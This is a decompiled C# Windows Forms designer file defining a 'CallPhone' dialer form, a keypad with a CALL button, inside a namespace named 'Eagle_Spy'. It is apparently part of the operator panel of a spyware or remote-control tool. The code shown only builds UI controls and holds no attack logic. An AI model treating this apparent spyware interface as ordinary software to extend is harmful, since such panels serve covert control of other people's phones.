namespace Eagle_Spy
{
	// Token: 0x02000029 RID: 41
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class CallPhone : global::System.Windows.Forms.Form
	{
		// Token: 0x06000327 RID: 807 RVA: 0x0004B380 File Offset: 0x00049580
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000328 RID: 808 RVA: 0x0004B3C0 File Offset: 0x000495C0
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.TextBox1 = new global::System.Windows.Forms.TextBox();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.drakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.b_DEL = new global::System.Windows.Forms.Button();
			this.B_hash = new global::System.Windows.Forms.Button();
			this.b0 = new global::System.Windows.Forms.Button();
			this.B_star = new global::System.Windows.Forms.Button();
			this.b9 = new global::System.Windows.Forms.Button();
			this.b8 = new global::System.Windows.Forms.Button();
			this.b7 = new global::System.Windows.Forms.Button();
			this.b6 = new global::System.Windows.Forms.Button();
			this.b5 = new global::System.Windows.Forms.Button();
			this.b4 = new global::System.Windows.Forms.Button();
			this.b3 = new global::System.Windows.Forms.Button();
			this.b2 = new global::System.Windows.Forms.Button();
			this.b1 = new global::System.Windows.Forms.Button();
			this.L0 = new global::System.Windows.Forms.Label();
			this.CMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.CutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CopyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PasteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Panel1.SuspendLayout();
			this.CMenu.SuspendLayout();
			base.SuspendLayout();
			this.TextBox1.BackColor = global::System.Drawing.Color.Black;
			this.TextBox1.ForeColor = global::System.Drawing.Color.White;
			this.TextBox1.Location = new global::System.Drawing.Point(37, 37);
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.ShortcutsEnabled = false;
			this.TextBox1.Size = new global::System.Drawing.Size(156, 20);
			this.TextBox1.TabIndex = 0;
			this.TextBox1.TextChanged += new global::System.EventHandler(this.TextBox1_TextChanged);
			this.TextBox1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.TextBox1_KeyDown);
			this.TextBox1.KeyPress += new global::System.Windows.Forms.KeyPressEventHandler(this.TextBox1_KeyPress);
			this.TOpacity.Interval = 1;
			this.TOpacity.Tick += new global::System.EventHandler(this.TOpacity_Tick);
			this.Panel1.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.Panel1.Controls.Add(this.drakeUIButtonIcon1);
			this.Panel1.Controls.Add(this.b_DEL);
			this.Panel1.Controls.Add(this.B_hash);
			this.Panel1.Controls.Add(this.b0);
			this.Panel1.Controls.Add(this.B_star);
			this.Panel1.Controls.Add(this.b9);
			this.Panel1.Controls.Add(this.b8);
			this.Panel1.Controls.Add(this.b7);
			this.Panel1.Controls.Add(this.b6);
			this.Panel1.Controls.Add(this.b5);
			this.Panel1.Controls.Add(this.b4);
			this.Panel1.Controls.Add(this.b3);
			this.Panel1.Controls.Add(this.b2);
			this.Panel1.Controls.Add(this.b1);
			this.Panel1.Controls.Add(this.L0);
			this.Panel1.Controls.Add(this.TextBox1);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Panel1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(232, 326);
			this.Panel1.TabIndex = 2;
			this.Panel1.Paint += new global::System.Windows.Forms.PaintEventHandler(this.Panel1_Paint);
			this.drakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.drakeUIButtonIcon1.FillColor = global::System.Drawing.Color.FromArgb(0, 64, 0);
			this.drakeUIButtonIcon1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.drakeUIButtonIcon1.Location = new global::System.Drawing.Point(23, 284);
			this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
			this.drakeUIButtonIcon1.Radius = 35;
			this.drakeUIButtonIcon1.RectColor = global::System.Drawing.Color.Green;
			this.drakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.drakeUIButtonIcon1.Size = new global::System.Drawing.Size(175, 35);
			this.drakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.drakeUIButtonIcon1.Symbol = 61589;
			this.drakeUIButtonIcon1.TabIndex = 21;
			this.drakeUIButtonIcon1.Text = "CALL";
			this.drakeUIButtonIcon1.Click += new global::System.EventHandler(this.drakeUIButtonIcon1_Click);
			this.b_DEL.FlatAppearance.BorderSize = 0;
			this.b_DEL.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.b_DEL.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b_DEL.ForeColor = global::System.Drawing.Color.Red;
			this.b_DEL.Location = new global::System.Drawing.Point(200, 37);
			this.b_DEL.Name = "b_DEL";
			this.b_DEL.Size = new global::System.Drawing.Size(32, 21);
			this.b_DEL.TabIndex = 15;
			this.b_DEL.Text = "<";
			this.b_DEL.UseVisualStyleBackColor = true;
			this.b_DEL.Click += new global::System.EventHandler(this.b_DEL_Click);
			this.B_hash.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.B_hash.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.B_hash.Location = new global::System.Drawing.Point(145, 224);
			this.B_hash.Name = "B_hash";
			this.B_hash.Size = new global::System.Drawing.Size(48, 48);
			this.B_hash.TabIndex = 14;
			this.B_hash.Text = "#";
			this.B_hash.UseVisualStyleBackColor = true;
			this.B_hash.Click += new global::System.EventHandler(this.B_hash_Click);
			this.b0.FlatAppearance.BorderSize = 0;
			this.b0.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b0.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b0.Font = new global::System.Drawing.Font("Calibri", 15f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.b0.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b0.Location = new global::System.Drawing.Point(91, 224);
			this.b0.Name = "b0";
			this.b0.Size = new global::System.Drawing.Size(48, 48);
			this.b0.TabIndex = 13;
			this.b0.Text = "0";
			this.b0.UseVisualStyleBackColor = true;
			this.b0.Click += new global::System.EventHandler(this.b0_Click);
			this.B_star.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.B_star.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.B_star.Location = new global::System.Drawing.Point(37, 224);
			this.B_star.Name = "B_star";
			this.B_star.Size = new global::System.Drawing.Size(48, 48);
			this.B_star.TabIndex = 12;
			this.B_star.Text = "*";
			this.B_star.UseVisualStyleBackColor = true;
			this.B_star.Click += new global::System.EventHandler(this.B_star_Click);
			this.b9.FlatAppearance.BorderSize = 0;
			this.b9.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b9.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b9.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b9.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b9.Location = new global::System.Drawing.Point(145, 170);
			this.b9.Name = "b9";
			this.b9.Size = new global::System.Drawing.Size(48, 48);
			this.b9.TabIndex = 11;
			this.b9.Text = "9";
			this.b9.UseVisualStyleBackColor = true;
			this.b9.Click += new global::System.EventHandler(this.b9_Click);
			this.b8.FlatAppearance.BorderSize = 0;
			this.b8.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b8.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b8.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b8.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b8.Location = new global::System.Drawing.Point(91, 170);
			this.b8.Name = "b8";
			this.b8.Size = new global::System.Drawing.Size(48, 48);
			this.b8.TabIndex = 10;
			this.b8.Text = "8";
			this.b8.UseVisualStyleBackColor = true;
			this.b8.Click += new global::System.EventHandler(this.b8_Click);
			this.b7.FlatAppearance.BorderSize = 0;
			this.b7.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b7.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b7.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b7.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b7.Location = new global::System.Drawing.Point(37, 170);
			this.b7.Name = "b7";
			this.b7.Size = new global::System.Drawing.Size(48, 48);
			this.b7.TabIndex = 9;
			this.b7.Text = "7";
			this.b7.UseVisualStyleBackColor = true;
			this.b7.Click += new global::System.EventHandler(this.b7_Click);
			this.b6.FlatAppearance.BorderSize = 0;
			this.b6.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b6.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b6.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b6.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b6.Location = new global::System.Drawing.Point(145, 116);
			this.b6.Name = "b6";
			this.b6.Size = new global::System.Drawing.Size(48, 48);
			this.b6.TabIndex = 8;
			this.b6.Text = "6";
			this.b6.UseVisualStyleBackColor = true;
			this.b6.Click += new global::System.EventHandler(this.b6_Click);
			this.b5.FlatAppearance.BorderSize = 0;
			this.b5.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b5.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b5.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b5.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b5.Location = new global::System.Drawing.Point(91, 116);
			this.b5.Name = "b5";
			this.b5.Size = new global::System.Drawing.Size(48, 48);
			this.b5.TabIndex = 7;
			this.b5.Text = "5";
			this.b5.UseVisualStyleBackColor = true;
			this.b5.Click += new global::System.EventHandler(this.b5_Click);
			this.b4.FlatAppearance.BorderSize = 0;
			this.b4.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b4.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b4.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b4.Location = new global::System.Drawing.Point(37, 116);
			this.b4.Name = "b4";
			this.b4.Size = new global::System.Drawing.Size(48, 48);
			this.b4.TabIndex = 6;
			this.b4.Text = "4";
			this.b4.UseVisualStyleBackColor = true;
			this.b4.Click += new global::System.EventHandler(this.b4_Click);
			this.b3.FlatAppearance.BorderSize = 0;
			this.b3.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b3.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b3.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b3.Location = new global::System.Drawing.Point(145, 62);
			this.b3.Name = "b3";
			this.b3.Size = new global::System.Drawing.Size(48, 48);
			this.b3.TabIndex = 5;
			this.b3.Text = "3";
			this.b3.UseVisualStyleBackColor = true;
			this.b3.Click += new global::System.EventHandler(this.b3_Click);
			this.b2.FlatAppearance.BorderSize = 0;
			this.b2.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b2.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b2.Location = new global::System.Drawing.Point(91, 62);
			this.b2.Name = "b2";
			this.b2.Size = new global::System.Drawing.Size(48, 48);
			this.b2.TabIndex = 4;
			this.b2.Text = "2";
			this.b2.UseVisualStyleBackColor = true;
			this.b2.Click += new global::System.EventHandler(this.b2_Click);
			this.b1.FlatAppearance.BorderSize = 0;
			this.b1.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Cyan;
			this.b1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.b1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 15f);
			this.b1.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.b1.Location = new global::System.Drawing.Point(37, 62);
			this.b1.Name = "b1";
			this.b1.Size = new global::System.Drawing.Size(48, 48);
			this.b1.TabIndex = 3;
			this.b1.Text = "1";
			this.b1.UseVisualStyleBackColor = true;
			this.b1.Click += new global::System.EventHandler(this.b1_Click);
			this.L0.AutoSize = true;
			this.L0.Location = new global::System.Drawing.Point(3, 9);
			this.L0.Name = "L0";
			this.L0.Size = new global::System.Drawing.Size(23, 13);
			this.L0.TabIndex = 2;
			this.L0.Text = "null";
			this.CMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.CutToolStripMenuItem, this.CopyToolStripMenuItem, this.PasteToolStripMenuItem });
			this.CMenu.Name = "CMenu";
			this.CMenu.ShowImageMargin = false;
			this.CMenu.Size = new global::System.Drawing.Size(78, 70);
			this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
			this.CutToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.CutToolStripMenuItem.Text = "Cut";
			this.CutToolStripMenuItem.Click += new global::System.EventHandler(this.CutToolStripMenuItem_Click);
			this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
			this.CopyToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.CopyToolStripMenuItem.Text = "Copy";
			this.CopyToolStripMenuItem.Click += new global::System.EventHandler(this.CopyToolStripMenuItem_Click);
			this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
			this.PasteToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.PasteToolStripMenuItem.Text = "Paste";
			this.PasteToolStripMenuItem.Click += new global::System.EventHandler(this.PasteToolStripMenuItem_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(10, 0, 10);
			base.ClientSize = new global::System.Drawing.Size(232, 326);
			base.Controls.Add(this.Panel1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.MaximizeBox = false;
			base.Name = "CallPhone";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			this.Text = "Call Phone";
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.CMenu.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x0400029E RID: 670
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040002A3 RID: 675
		internal global::System.Windows.Forms.TextBox TextBox1;

		// Token: 0x040002A4 RID: 676
		internal global::System.Windows.Forms.Timer TOpacity;

		// Token: 0x040002A5 RID: 677
		internal global::System.Windows.Forms.Panel Panel1;

		// Token: 0x040002A6 RID: 678
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("L0")]
		internal global::System.Windows.Forms.Label L0;

		// Token: 0x040002A7 RID: 679
		internal global::System.Windows.Forms.Button B_hash;

		// Token: 0x040002A8 RID: 680
		internal global::System.Windows.Forms.Button b0;

		// Token: 0x040002A9 RID: 681
		internal global::System.Windows.Forms.Button B_star;

		// Token: 0x040002AA RID: 682
		internal global::System.Windows.Forms.Button b9;

		// Token: 0x040002AB RID: 683
		internal global::System.Windows.Forms.Button b8;

		// Token: 0x040002AC RID: 684
		internal global::System.Windows.Forms.Button b7;

		// Token: 0x040002AD RID: 685
		internal global::System.Windows.Forms.Button b6;

		// Token: 0x040002AE RID: 686
		internal global::System.Windows.Forms.Button b5;

		// Token: 0x040002AF RID: 687
		internal global::System.Windows.Forms.Button b4;

		// Token: 0x040002B0 RID: 688
		internal global::System.Windows.Forms.Button b3;

		// Token: 0x040002B1 RID: 689
		internal global::System.Windows.Forms.Button b2;

		// Token: 0x040002B2 RID: 690
		internal global::System.Windows.Forms.Button b1;

		// Token: 0x040002B3 RID: 691
		internal global::System.Windows.Forms.Button b_DEL;

		// Token: 0x040002B4 RID: 692
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("CMenu")]
		internal global::System.Windows.Forms.ContextMenuStrip CMenu;

		// Token: 0x040002B5 RID: 693
		internal global::System.Windows.Forms.ToolStripMenuItem CutToolStripMenuItem;

		// Token: 0x040002B6 RID: 694
		internal global::System.Windows.Forms.ToolStripMenuItem CopyToolStripMenuItem;

		// Token: 0x040002B7 RID: 695
		internal global::System.Windows.Forms.ToolStripMenuItem PasteToolStripMenuItem;

		// Token: 0x040002B8 RID: 696
		private global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon1;
	}
}
